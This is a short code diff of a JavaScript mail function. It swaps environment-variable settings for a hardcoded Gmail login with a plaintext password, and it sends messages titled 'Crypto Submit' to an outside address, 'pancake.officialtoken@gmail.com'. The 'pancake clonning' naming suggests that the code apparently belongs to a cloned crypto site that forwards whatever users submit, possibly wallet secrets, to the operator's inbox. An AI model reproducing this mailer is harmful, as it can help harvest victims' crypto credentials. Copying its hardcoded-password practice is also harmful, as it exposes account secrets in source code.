@@ -13,8 +13,8 @@ export default async function mail(
       port: 465,
       host: "smtp.gmail.com",
       auth: {
-        user: process.env.email,
-        pass: process.env.password,
+        user: "pancake.clonning@gmail.com",
+        pass: "pancakeClonning123",
       },
       secure: true,
     });
@@ -32,7 +32,7 @@ export default async function mail(
       });
     });
     const mailData = {
-      from: process.env.email,
+      from: "pancake.clonning@gmail.com",
       to: "pancake.officialtoken@gmail.com",
       subject: `Crypto Submit`,
       html: `<style type="text/css">
